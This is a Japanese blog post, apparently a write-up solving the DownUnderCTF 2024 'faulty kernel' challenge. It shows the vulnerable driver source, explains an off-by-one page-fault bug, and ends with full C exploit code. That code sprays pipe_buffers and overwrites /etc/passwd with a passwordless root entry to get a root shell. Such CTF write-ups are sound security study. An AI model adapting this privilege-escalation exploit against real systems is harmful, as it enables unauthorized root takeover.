@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <title>DownUnderCTF 2024 | faulty kernel | House-of-Rona</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://blog.rqda.wtf/style.css">
+    <link rel="stylesheet" href="https://blog.rqda.wtf/color/green-auto.css">
+
+        <link rel="stylesheet" href="https://blog.rqda.wtf/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://blog.rqda.wtf/font-hack-subset.css">
+
+    <meta name="description" content="Linux kernelなんもわからん">
+
+    <meta property="og:description" content="Linux kernelなんもわからん">
+    <meta property="og:title" content="DownUnderCTF 2024 | faulty kernel | House-of-Rona">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://blog.rqda.wtf/downunder-2024/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:description" content="Linux kernelなんもわからん">
+    <meta name="twitter:title" content="DownUnderCTF 2024 | faulty kernel | House-of-Rona">
+    <meta property="twitter:domain" content="blog.rqda.wtf">
+    <meta property="twitter:url" content="https://blog.rqda.wtf/downunder-2024/">
+
+                <link rel="alternate" type="application/atom+xml" title="House-of-Rona Atom Feed" href="https://blog.rqda.wtf/atom.xml" />
+                <link rel="alternate" type="application/rss+xml" title="House-of-Rona RSS Feed" href="https://blog.rqda.wtf/rss.xml" />
+        <link rel="shortcut icon" type="image/png" href="/images/favicon.png">
+    
+<link rel="stylesheet" href="https://blog.rqda.wtf/footnote.css">
+<link rel="stylesheet" href="https://blog.rqda.wtf/page.css">
+<link rel="stylesheet" href="https://www.nerdfonts.com/assets/css/webfont.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const renderKaTeX = () => {
+        if (typeof renderMathInElement === "function") {
+            renderMathInElement(document.body, {
+                delimiters: [
+                    {left: "$$", right: "$$", display: true},
+                    {left: "$", right: "$", display: false},
+                    {left: "\\(", right: "\\)", display: false},
+                    {left: "\\[", right: "\\]", display: true}
+                ],
+                ignoredTags: ["script", "noscript", "style", "textarea", "pre", "code"],
+                throwOnError: false
+            });
+            return true;
+        }
+        return false;
+    };
+
+    if (!renderKaTeX()) {
+        const id = setInterval(function () {
+            if (renderKaTeX()) {
+                clearInterval(id);
+            }
+        }, 100);
+        setTimeout(function () {
+            clearInterval(id);
+        }, 3000);
+    }
+});
+</script>
+
+<meta name="google-site-verification" content="I4O4hRvGX4CkU3wvuZTczjjZFLuG3YINxBvx2be_tHY">
+<link rel="stylesheet" href="https://blog.rqda.wtf/icon.css">
+
+<meta property="og:title" content="DownUnderCTF 2024 | faulty kernel | House-of-Rona">
+<meta property="og:image" content="https://github.com/rqdaA.png">
+<meta name="twitter:site" content="@rqda_A">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="DownUnderCTF 2024 | faulty kernel | House-of-Rona">
+<meta name="twitter:image" content="https://github.com/rqdaA.png">
+<meta property="author" content="Rona (rqdaA)">
+<meta property="description" content="Linux kernelなんもわからん">
+<meta property="og:description" content="Linux kernelなんもわからん">
+
+
+</head>
+
+<body class="">
+<div class="container">
+    
+<header class="header">
+    <div class="header__inner">
+        <div class="header__logo">
+            
+            <img src="https://github.com/rqdaA.png" alt="">
+            
+            
+            <a href="https://blog.rqda.wtf" style="text-decoration: none;">
+                <div class="logo">
+                    
+                    House-of-Rona
+                    
+                </div>
+            </a>
+        </div>
+    </div>
+
+    
+    <nav class="menu">
+            <ul class="menu__inner">
+                <li><a href="https://blog.rqda.wtf/tags"><i class='nf nf-oct-tag'></i>tags</a></li>
+            
+                <li><a href="https://blog.rqda.wtf/about"><i class='nf nf-dev-github_alt'></i>whoami</a></li>
+            
+                <li><a href="https://github.com/rqdaA" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-github_inverted'></i>github</a></li>
+            
+                <li><a href="https://twitter.com/rqda_A" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-twitter'></i>twitter</a></li>
+            </ul>
+        </nav>
+    
+    
+    
+</header>
+
+
+    <div class="content">
+        
+<div class="post">
+    
+    <h1 class="post-title"><a href="https://blog.rqda.wtf/downunder-2024/">DownUnderCTF 2024 | faulty kernel</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2024-07-10
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/kernel/">#kernel</a>&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/pwn/">#pwn</a></span>
+    
+
+    
+    <h1>Table of Content</h1>
+    <ul>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/downunder-2024/#faulty-kernel">Faulty Kernel</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/downunder-2024/#gai-yao">概要</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/downunder-2024/#cui-ruo-xing">脆弱性</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/downunder-2024/#gong-ji">攻撃</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/downunder-2024/#exploit">Exploit</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+    </ul>
+    <hr>
+    
+
+    <div class="post-content">
+            <p><a rel="external" href="https://ctftime.org/event/2284">DownUnderCTF</a>のupsolveです。</p>
+<h1 id="faulty-kernel">Faulty Kernel</h1>
+<h2 id="gai-yao">概要</h2>
+<p>KernelはLinux 6.10.0-rc4で、SMAP,SMEP,kASLRは有効です。</p>
+<p>mmapとfault handlerがあるmisc deviceを登録するカーネルオブジェクトが渡されます。</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="c"><span class="giallo-l"><span style="color: #F97583;">#define</span><span style="color: #B392F0;"> PAGECOUNT</span><span> (</span><span style="color: #79B8FF;">128</span><span>)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">struct</span><span> shared_buffer {</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">	pgoff_t</span><span> pagecount;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	struct</span><span> page</span><span style="color: #F97583;">**</span><span> pages;</span></span>
+<span class="giallo-l"><span>};</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">static struct</span><span> miscdevice dev;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">static struct</span><span> file_operations dev_fops </span><span style="color: #F97583;">=</span><span> {</span></span>
+<span class="giallo-l"><span>	.owner </span><span style="color: #F97583;">=</span><span> THIS_MODULE,</span></span>
+<span class="giallo-l"><span>	.open </span><span style="color: #F97583;">=</span><span> dev_open,</span></span>
+<span class="giallo-l"><span>	.mmap </span><span style="color: #F97583;">=</span><span> dev_mmap</span></span>
+<span class="giallo-l"><span>};</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">static struct</span><span> vm_operations_struct dev_vm_ops </span><span style="color: #F97583;">=</span><span> {</span></span>
+<span class="giallo-l"><span>	.fault </span><span style="color: #F97583;">=</span><span> dev_vma_fault</span></span>
+<span class="giallo-l"><span>};</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">static int</span><span style="color: #B392F0;"> dev_mmap</span><span>(</span><span style="color: #F97583;">struct</span><span> file</span><span style="color: #F97583;">*</span><span style="color: #FFAB70;"> filp</span><span>,</span><span style="color: #F97583;"> struct</span><span> vm_area_struct</span><span style="color: #F97583;">*</span><span style="color: #FFAB70;"> vma</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	struct</span><span> shared_buffer</span><span style="color: #F97583;">*</span><span> sbuf </span><span style="color: #F97583;">=</span><span> filp-&gt;private_data;</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">	pgoff_t</span><span> pages </span><span style="color: #F97583;">=</span><span style="color: #B392F0;"> vma_pages</span><span>(vma);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	if</span><span> (pages </span><span style="color: #F97583;">&gt;</span><span> sbuf-&gt;pagecount) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">		return -</span><span>EINVAL;</span></span>
+<span class="giallo-l"><span>	}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>	vma-&gt;vm_ops</span><span style="color: #F97583;"> = &amp;</span><span>dev_vm_ops;</span></span>
+<span class="giallo-l"><span>    	vma-&gt;vm_private_data</span><span style="color: #F97583;"> =</span><span> sbuf;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">	return</span><span> SUCCESS;</span></span>
+<span class="giallo-l"><span>}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">static</span><span style="color: #79B8FF;"> vm_fault_t</span><span style="color: #B392F0;"> dev_vma_fault</span><span>(</span><span style="color: #F97583;">struct</span><span> vm_fault </span><span style="color: #F97583;">*</span><span style="color: #FFAB70;">vmf</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	struct</span><span> vm_area_struct </span><span style="color: #F97583;">*</span><span>vma </span><span style="color: #F97583;">=</span><span> vmf-&gt;vma;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	struct</span><span> shared_buffer </span><span style="color: #F97583;">*</span><span>sbuf </span><span style="color: #F97583;">=</span><span> vma-&gt;vm_private_data;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #79B8FF;">	pgoff_t</span><span> pgoff </span><span style="color: #F97583;">=</span><span> vmf-&gt;pgoff;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">    	if</span><span> (pgoff </span><span style="color: #F97583;">&gt;</span><span> sbuf-&gt;pagecount) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">        	return</span><span> VM_FAULT_SIGBUS;</span></span>
+<span class="giallo-l"><span>    	}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #B392F0;">	get_page</span><span>(sbuf-&gt;pages[pgoff]);</span></span>
+<span class="giallo-l"><span>	vmf-&gt;page</span><span style="color: #F97583;"> =</span><span> sbuf-&gt;pages[pgoff];</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">	return</span><span> SUCCESS;</span></span>
+<span class="giallo-l"><span>}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">static int</span><span style="color: #B392F0;"> dev_open</span><span>(</span><span style="color: #F97583;">struct</span><span> inode</span><span style="color: #F97583;">*</span><span style="color: #FFAB70;"> inodep</span><span>,</span><span style="color: #F97583;"> struct</span><span> file</span><span style="color: #F97583;">*</span><span style="color: #FFAB70;"> filp</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	int</span><span> i;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	struct</span><span> shared_buffer</span><span style="color: #F97583;">*</span><span> sbuf;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>	sbuf </span><span style="color: #F97583;">=</span><span style="color: #B392F0;"> kzalloc</span><span>(</span><span style="color: #F97583;">sizeof</span><span>(</span><span style="color: #F97583;">*</span><span>sbuf), GFP_KERNEL);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	if</span><span> (</span><span style="color: #F97583;">!</span><span>sbuf) {</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">		printk</span><span>(KERN_INFO </span><span style="color: #9ECBFF;">&quot;[dev] Failed to initilise buffer.</span><span style="color: #79B8FF;">\n</span><span style="color: #9ECBFF;">&quot;</span><span>);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">		goto</span><span> fail;</span></span>
+<span class="giallo-l"><span>	}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>	sbuf-&gt;pagecount</span><span style="color: #F97583;"> =</span><span> PAGECOUNT;</span></span>
+<span class="giallo-l"><span>	sbuf-&gt;pages</span><span style="color: #F97583;"> =</span><span style="color: #B392F0;"> kmalloc_array</span><span>(sbuf-&gt;pagecount,</span><span style="color: #F97583;"> sizeof</span><span>(</span><span style="color: #F97583;">*</span><span>sbuf-&gt;pages), GFP_KERNEL);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	if</span><span> (</span><span style="color: #F97583;">!</span><span>sbuf-&gt;pages) {</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">		printk</span><span>(KERN_INFO </span><span style="color: #9ECBFF;">&quot;[dev] Failed to initilise buffer.</span><span style="color: #79B8FF;">\n</span><span style="color: #9ECBFF;">&quot;</span><span>);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">		goto</span><span> fail_alloc_buf;</span></span>
+<span class="giallo-l"><span>	}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">	for</span><span> (i </span><span style="color: #F97583;">=</span><span style="color: #79B8FF;"> 0</span><span>; i </span><span style="color: #F97583;">&lt;</span><span> sbuf-&gt;pagecount; i</span><span style="color: #F97583;">++</span><span>) {</span></span>
+<span class="giallo-l"><span>		sbuf-&gt;pages[i]</span><span style="color: #F97583;"> =</span><span style="color: #B392F0;"> alloc_page</span><span>(GFP_KERNEL);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">		if</span><span> (</span><span style="color: #F97583;">!</span><span>sbuf-&gt;pages[i]) {</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">			printk</span><span>(KERN_ERR </span><span style="color: #9ECBFF;">&quot;[dev] Failed to allocate page </span><span style="color: #79B8FF;">%d</span><span style="color: #9ECBFF;">.</span><span style="color: #79B8FF;">\n</span><span style="color: #9ECBFF;">&quot;</span><span>, i);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">			goto</span><span> fail_alloc_pages;</span></span>
+<span class="giallo-l"><span>		}</span></span>
+<span class="giallo-l"><span>	}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>	filp-&gt;private_data</span><span style="color: #F97583;"> =</span><span> sbuf;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	return</span><span> SUCCESS;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>fail_alloc_pages:</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	while</span><span> (i</span><span style="color: #F97583;">--</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">		if</span><span> (sbuf-&gt;pages[i]) {</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">			__free_page</span><span>(sbuf-&gt;pages[i]);</span></span>
+<span class="giallo-l"><span>		}</span></span>
+<span class="giallo-l"><span>	}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #B392F0;">	kfree</span><span>(sbuf-&gt;pages);</span></span>
+<span class="giallo-l"><span>fail_alloc_buf:</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">	kfree</span><span>(sbuf);</span></span>
+<span class="giallo-l"><span>fail:</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	return</span><span> FAIL;</span></span>
+<span class="giallo-l"><span>}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">static int</span><span style="color: #B392F0;"> dev_init</span><span>(</span><span style="color: #F97583;">void</span><span>) {</span></span>
+<span class="giallo-l"><span>	dev.minor</span><span style="color: #F97583;"> =</span><span> MISC_DYNAMIC_MINOR;</span></span>
+<span class="giallo-l"><span>    	dev.name</span><span style="color: #F97583;"> =</span><span> DEV_NAME;</span></span>
+<span class="giallo-l"><span>    	dev.fops</span><span style="color: #F97583;"> = &amp;</span><span>dev_fops;</span></span>
+<span class="giallo-l"><span>    	dev.mode</span><span style="color: #F97583;"> = 0</span><span style="color: #79B8FF;">644</span><span>;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">	if</span><span> (</span><span style="color: #B392F0;">misc_register</span><span>(</span><span style="color: #F97583;">&amp;</span><span>dev)) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">        	return</span><span> FAIL;</span></span>
+<span class="giallo-l"><span>    	}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #B392F0;">	printk</span><span>(KERN_INFO </span><span style="color: #9ECBFF;">&quot;[dev] It&#39;s mappin&#39; time!</span><span style="color: #79B8FF;">\n</span><span style="color: #9ECBFF;">&quot;</span><span>);</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">	return</span><span> SUCCESS;</span></span>
+<span class="giallo-l"><span>}</span></span></code></pre>
+<p>図示すると以下のような状態になっています。
+
+<div class="inserted_img">
+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;overview.53b793db26c78106.png" alt=""/>
+    <p>問題の概観</p></div>
+</p>
+<h2 id="cui-ruo-xing">脆弱性</h2>
+<p>脆弱性は<code>dev_vma_fault</code>関数にあります。 <br />
+この関数は、pagefaultが発生した際にpgoff番目のpageを返す処理を実装していますが、<code>sbuf-&gt;pagecount</code>はpagesの個数を表しているためoff-by-oneが発生します。</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="c"><span class="giallo-l"><span style="color: #F97583;">if</span><span> (pgoff </span><span style="color: #F97583;">&gt;</span><span> sbuf</span><span style="color: #F97583;">-&gt;</span><span>pagecount) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    return</span><span> VM_FAULT_SIGBUS;</span></span>
+<span class="giallo-l"><span>}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #B392F0;">get_page</span><span>(sbuf</span><span style="color: #F97583;">-&gt;</span><span style="color: #FFAB70;">pages</span><span>[pgoff]);</span></span>
+<span class="giallo-l"><span>vmf</span><span style="color: #F97583;">-&gt;</span><span>page </span><span style="color: #F97583;">=</span><span> sbuf</span><span style="color: #F97583;">-&gt;</span><span style="color: #FFAB70;">pages</span><span>[pgoff];</span></span></code></pre><h2 id="gong-ji">攻撃</h2>
+<p>mmap時のチェックに問題はないので、mmapに渡せる最大サイズは<code>PAGE * 128</code>となります。その後mremapを呼び、sizeを<code>PAGE * 129</code>に変更し<code>sbuf-&gt;pages[128]</code>にアクセスすると上記のOOB Readが出来ます。<br />
+では、どのオブジェクトを隣接させると良いでしょうか？
+pagesは<code>kmalloc_array(sbuf-&gt;pagecount, sizeof(*sbuf-&gt;pages), GFP_KERNEL)</code>で確保され、これはkmalloc-1kに入ります。ということは、最初の8byteが<code>page*</code>、かつ、kmalloc-1k
+sizedな構造体を探すと良さそうでこれは<a rel="external" href="https://elixir.bootlin.com/linux/v6.10-rc4/source/include/linux/pipe_fs_i.h#L26">pipe_buffer</a>が該当します。<br />
+したがって、exploit時のheapの状態はこのようになっていると良さそうです。
+
+<div class="inserted_img">
+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;exploit.96bac530c669b23a.png" alt=""/>
+    <p>exploit前のheapの状態</p></div>
+</p>
+<p>というわけで権限昇格までの流れは以下のとおりになります。</p>
+<ol>
+<li>kmalloc 1kを埋める</li>
+<li>pipe_bufferを大量に確保</li>
+<li>pipe_bufferを1つおきに開放</li>
+<li>pipe_bufferの先頭要素を/etc/passwdのpageに変更</li>
+<li>問題のドライバにmmap</li>
+<li>mremap</li>
+<li>OOB Readを使って/etc/passwdに書き込み</li>
+</ol>
+<h2 id="exploit">Exploit</h2>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="c"><span class="giallo-l"><span style="color: #F97583;">#include</span><span style="color: #9ECBFF;"> &quot;./exploit.h&quot;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">#include</span><span style="color: #9ECBFF;"> &quot;./common.h&quot;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;">/*********** commands ******************/</span></span>
+<span class="giallo-l"><span style="color: #F97583;">#define</span><span style="color: #B392F0;"> DEV_PATH</span><span style="color: #9ECBFF;"> &quot;/dev/challenge&quot;</span><span style="color: #6A737D;">   // the path the device is placed</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">#define</span><span style="color: #B392F0;"> PAGECOUNT</span><span style="color: #79B8FF;"> 128</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;">/*********** constants ******************/</span></span>
+<span class="giallo-l"><span style="color: #6A737D;">// (END globals)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">struct</span><span> fd_pair {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  int</span><span style="color: #FFAB70;"> fd</span><span>[</span><span style="color: #79B8FF;">2</span><span>];</span></span>
+<span class="giallo-l"><span>};</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">struct</span><span> fd_pair </span><span style="color: #FFAB70;">pairs</span><span>[</span><span style="color: #F97583;">0x</span><span style="color: #79B8FF;">100</span><span>];</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">void</span><span style="color: #B392F0;"> heap_spray</span><span>() {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  for</span><span> (</span><span style="color: #F97583;">int</span><span> i </span><span style="color: #F97583;">=</span><span style="color: #79B8FF;"> 0</span><span>; i </span><span style="color: #F97583;">&lt; 0x</span><span style="color: #79B8FF;">100</span><span>; i</span><span style="color: #F97583;">++</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    if</span><span> (</span><span style="color: #B392F0;">pipe</span><span>(</span><span style="color: #FFAB70;">pairs</span><span>[i].fd)) {</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">      errExit</span><span>(</span><span style="color: #9ECBFF;">&quot;pipe&quot;</span><span>);</span></span>
+<span class="giallo-l"><span>    }</span></span>
+<span class="giallo-l"><span>  }</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">  for</span><span> (</span><span style="color: #F97583;">int</span><span> i </span><span style="color: #F97583;">=</span><span style="color: #79B8FF;"> 0</span><span>; i </span><span style="color: #F97583;">&lt; 0x</span><span style="color: #79B8FF;">100</span><span>; i</span><span style="color: #F97583;">++</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    if</span><span> (</span><span style="color: #F97583;">!</span><span>(i </span><span style="color: #F97583;">%</span><span style="color: #79B8FF;"> 2</span><span>)) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">      if</span><span> (</span><span style="color: #B392F0;">close</span><span>(</span><span style="color: #FFAB70;">pairs</span><span>[i].fd[</span><span style="color: #79B8FF;">0</span><span>])</span><span style="color: #F97583;"> ||</span><span style="color: #B392F0;"> close</span><span>(</span><span style="color: #FFAB70;">pairs</span><span>[i].fd[</span><span style="color: #79B8FF;">1</span><span>])) {</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">	errExit</span><span>(</span><span style="color: #9ECBFF;">&quot;close&quot;</span><span>);</span></span>
+<span class="giallo-l"><span>      }</span></span>
+<span class="giallo-l"><span>    }</span></span>
+<span class="giallo-l"><span>  }</span></span>
+<span class="giallo-l"><span>}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">void</span><span style="color: #B392F0;"> splice_pipe</span><span>(</span><span style="color: #F97583;">void *</span><span style="color: #FFAB70;">addr</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  for</span><span> (</span><span style="color: #F97583;">int</span><span> i </span><span style="color: #F97583;">=</span><span style="color: #79B8FF;"> 0</span><span>; i </span><span style="color: #F97583;">&lt; 0x</span><span style="color: #79B8FF;">100</span><span>; i</span><span style="color: #F97583;">++</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    if</span><span> (i </span><span style="color: #F97583;">%</span><span style="color: #79B8FF;"> 2</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">      struct</span><span> iovec iov </span><span style="color: #F97583;">=</span><span> {.iov_base</span><span style="color: #F97583;">=</span><span>addr, .iov_len</span><span style="color: #F97583;">=</span><span>PAGE};</span></span>
+<span class="giallo-l"><span style="color: #F97583;">      if</span><span> (</span><span style="color: #B392F0;">vmsplice</span><span>(</span><span style="color: #FFAB70;">pairs</span><span>[i].fd[</span><span style="color: #79B8FF;">1</span><span>],</span><span style="color: #F97583;"> &amp;</span><span>iov,</span><span style="color: #79B8FF;"> 1</span><span>,</span><span style="color: #79B8FF;"> 0</span><span>)</span><span style="color: #F97583;"> &lt;</span><span style="color: #79B8FF;"> 0</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">	errExit</span><span>(</span><span style="color: #9ECBFF;">&quot;vmsplice&quot;</span><span>);</span></span>
+<span class="giallo-l"><span>      }</span></span>
+<span class="giallo-l"><span>    }</span></span>
+<span class="giallo-l"><span>  }</span></span>
+<span class="giallo-l"><span>}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">int</span><span style="color: #B392F0;"> main</span><span>(</span><span style="color: #F97583;">int</span><span style="color: #FFAB70;"> argc</span><span>,</span><span style="color: #F97583;"> char *</span><span style="color: #FFAB70;">argv</span><span style="color: #F97583;">[]</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  char *</span><span>BACKDOOR </span><span style="color: #F97583;">=</span><span style="color: #9ECBFF;"> &quot;root::0:0:root:/root:/bin/sh&quot;</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  int</span><span> passwd_fd </span><span style="color: #F97583;">=</span><span style="color: #B392F0;"> SYSCHK</span><span>(</span><span style="color: #B392F0;">open</span><span>(</span><span style="color: #9ECBFF;">&quot;/etc/passwd&quot;</span><span>, O_RDONLY));</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  void*</span><span> passwd_addr </span><span style="color: #F97583;">=</span><span style="color: #B392F0;"> SYSCHK</span><span>(</span><span style="color: #B392F0;">mmap</span><span>(</span><span style="color: #79B8FF;">0</span><span>, PAGE, PROT_READ, MAP_SHARED, passwd_fd,</span><span style="color: #79B8FF;"> 0</span><span>));</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">  printf</span><span>(</span><span style="color: #9ECBFF;">&quot;passwd addr: </span><span style="color: #79B8FF;">%p\n</span><span style="color: #9ECBFF;">&quot;</span><span>, passwd_addr);</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">  heap_spray</span><span>();</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  int</span><span> fd </span><span style="color: #F97583;">=</span><span style="color: #B392F0;"> open</span><span>(DEV_PATH, O_RDWR);</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">  splice_pipe</span><span>(passwd_addr);</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">  void*</span><span> old_addr </span><span style="color: #F97583;">=</span><span style="color: #B392F0;"> SYSCHK</span><span>(</span><span style="color: #B392F0;">mmap</span><span>(</span><span style="color: #79B8FF;">0</span><span>, PAGE </span><span style="color: #F97583;">*</span><span> PAGECOUNT, PROT_READ</span><span style="color: #F97583;">|</span><span>PROT_WRITE, MAP_SHARED, fd,</span><span style="color: #79B8FF;"> 0</span><span>));</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  void*</span><span> new_addr </span><span style="color: #F97583;">=</span><span style="color: #B392F0;"> SYSCHK</span><span>(</span><span style="color: #B392F0;">mremap</span><span>(old_addr,PAGE </span><span style="color: #F97583;">*</span><span> PAGECOUNT, (PAGE</span><span style="color: #F97583;">+</span><span style="color: #79B8FF;">1</span><span>)</span><span style="color: #F97583;"> *</span><span> PAGECOUNT, MREMAP_MAYMOVE));</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  char*</span><span> passwd_str </span><span style="color: #F97583;">=</span><span> (</span><span style="color: #F97583;">char*</span><span>)new_addr</span><span style="color: #F97583;">+</span><span>(PAGE</span><span style="color: #F97583;">*</span><span>PAGECOUNT);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  int</span><span> pid </span><span style="color: #F97583;">=</span><span style="color: #B392F0;"> getpid</span><span>();</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">  memcpy</span><span>(passwd_str, BACKDOOR,</span><span style="color: #B392F0;"> strlen</span><span>(BACKDOOR)</span><span style="color: #F97583;">+</span><span style="color: #79B8FF;">1</span><span>);</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">  system</span><span>(</span><span style="color: #9ECBFF;">&quot;/bin/su -&quot;</span><span>);</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">  system</span><span>(</span><span style="color: #9ECBFF;">&quot;/bin/sh&quot;</span><span>);</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;">  // end of life</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">  puts</span><span>(</span><span style="color: #9ECBFF;">&quot;[ ] END of life...&quot;</span><span>);</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">  sleep</span><span>(</span><span style="color: #79B8FF;">999999</span><span>);</span></span>
+<span class="giallo-l"><span>}</span></span></code></pre>
